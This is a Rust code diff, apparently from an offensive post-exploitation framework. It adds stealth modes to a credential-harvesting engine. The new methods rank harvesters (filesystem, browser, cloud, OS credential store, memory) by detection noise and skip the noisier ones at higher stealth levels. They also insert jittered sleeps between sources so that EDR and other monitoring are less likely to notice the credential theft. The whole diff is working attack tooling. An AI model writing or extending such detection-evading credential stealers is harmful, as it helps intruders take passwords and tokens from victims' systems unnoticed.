@@ -36,6 +36,7 @@ use uuid::Uuid;
 use crate::core::module::{
     CheckResult, Module, ModuleInfo, ModuleOption, ModuleResult, ModuleType, Platform, Session,
 };
+use crate::modules::evasion::opsec::{OpsecConfig, DefaultTrafficShaper, TrafficShaper};
 
 // ============================================================================
 // Core Types
@@ -1466,6 +1467,144 @@ impl CredentialHarvestEngine {
     /// Clear harvested credentials
     pub fn clear(&mut self) {
         self.harvested.clear();
+    }
+
+    // =========================================================================
+    // OPSEC Integration Methods
+    // =========================================================================
+
+    /// Harvest with Ghost mode OPSEC (maximum stealth)
+    ///
+    /// Uses Ghost-level OPSEC configuration:
+    /// - 45+ second sleep between harvesting sources with 50-80% jitter
+    /// - Only low-noise harvesters used (file-based, not memory)
+    /// - EDR-aware execution
+    pub async fn harvest_ghost(
+        &mut self,
+        session: &Session,
+        safe_mode: bool,
+    ) -> Result<Vec<HarvestResult>> {
+        self.harvest_with_opsec(session, OpsecConfig::ghost(), safe_mode).await
+    }
+
+    /// Harvest with Silent mode OPSEC (high stealth)
+    pub async fn harvest_silent(
+        &mut self,
+        session: &Session,
+        safe_mode: bool,
+    ) -> Result<Vec<HarvestResult>> {
+        self.harvest_with_opsec(session, OpsecConfig::silent(), safe_mode).await
+    }
+
+    /// Harvest with Quiet mode OPSEC (balanced)
+    pub async fn harvest_quiet(
+        &mut self,
+        session: &Session,
+        safe_mode: bool,
+    ) -> Result<Vec<HarvestResult>> {
+        self.harvest_with_opsec(session, OpsecConfig::quiet(), safe_mode).await
+    }
+
+    /// Harvest with custom OPSEC configuration
+    ///
+    /// Applies traffic shaping between harvesting from each source
+    /// to avoid detection patterns.
+    pub async fn harvest_with_opsec(
+        &mut self,
+        session: &Session,
+        opsec_config: OpsecConfig,
+        safe_mode: bool,
+    ) -> Result<Vec<HarvestResult>> {
+        let traffic_shaper = DefaultTrafficShaper::new(opsec_config.clone());
+        let mut results = Vec::new();
+
+        info!(
+            stealth_level = %opsec_config.stealth_level.as_str(),
+            "Starting OPSEC-aware credential harvesting"
+        );
+
+        // In Ghost mode, prefer file-based harvesters over memory-based
+        let harvester_names: Vec<(String, SourceCategory)> = self
+            .harvesters
+            .iter()
+            .filter(|h| h.platform() == session.platform || h.platform() == Platform::Any)
+            .map(|h| (h.name().to_string(), h.category()))
+            .collect();
+
+        // Sort harvesters by noise level (file-based first for stealth)
+        let mut sorted_harvesters = harvester_names;
+        sorted_harvesters.sort_by(|a, b| {
+            let noise_a = match a.1 {
+                SourceCategory::FileSystem => 1,
+                SourceCategory::Application => 2,
+                SourceCategory::Browser => 3,
+                SourceCategory::Cloud => 4,
+                SourceCategory::OsCredentialStore => 5,
+                SourceCategory::Memory => 6,
+                SourceCategory::Network => 7,
+            };
+            let noise_b = match b.1 {
+                SourceCategory::FileSystem => 1,
+                SourceCategory::Application => 2,
+                SourceCategory::Browser => 3,
+                SourceCategory::Cloud => 4,
+                SourceCategory::OsCredentialStore => 5,
+                SourceCategory::Memory => 6,
+                SourceCategory::Network => 7,
+            };
+            noise_a.cmp(&noise_b)
+        });
+
+        // In Ghost mode, skip memory-based harvesters (too noisy)
+        let harvesters_to_run: Vec<_> = if opsec_config.stealth_level >= crate::modules::evasion::opsec::StealthLevel::Ghost {
+            sorted_harvesters.into_iter()
+                .filter(|(_, cat)| *cat != SourceCategory::Memory && *cat != SourceCategory::Network)
+                .collect()
+        } else if opsec_config.stealth_level >= crate::modules::evasion::opsec::StealthLevel::Silent {
+            sorted_harvesters.into_iter()
+                .filter(|(_, cat)| *cat != SourceCategory::Network)
+                .collect()
+        } else {
+            sorted_harvesters
+        };
+
+        for (idx, (name, _category)) in harvesters_to_run.iter().enumerate() {
+            // Apply OPSEC delay between harvesters (except first)
+            if idx > 0 {
+                info!("Applying OPSEC sleep with jitter before next harvester");
+                traffic_shaper.sleep_with_jitter().await;
+            }
+
+            let harvester = self
+                .harvesters
+                .iter()
+                .find(|h| h.name() == *name)
+                .unwrap();
+
+            match harvester.harvest(session, safe_mode).await {
+                Ok(result) => {
+                    info!(
+                        harvester = name.as_str(),
+                        credentials = result.credentials.len(),
+                        "OPSEC harvest completed"
+                    );
+                    self.harvested.extend(result.credentials.clone());
+                    results.push(result);
+                }
+                Err(e) => {
+                    warn!(harvester = name.as_str(), error = %e, "OPSEC harvest failed");
+                    results.push(HarvestResult {
+                        success: false,
+                        harvester_name: name.clone(),
+                        credentials: vec![],
+                        message: format!("OPSEC harvest failed: {}", e),
+                        errors: vec![e.to_string()],
+                    });
+                }
+            }
+        }
+
+        Ok(results)
     }
 }
 
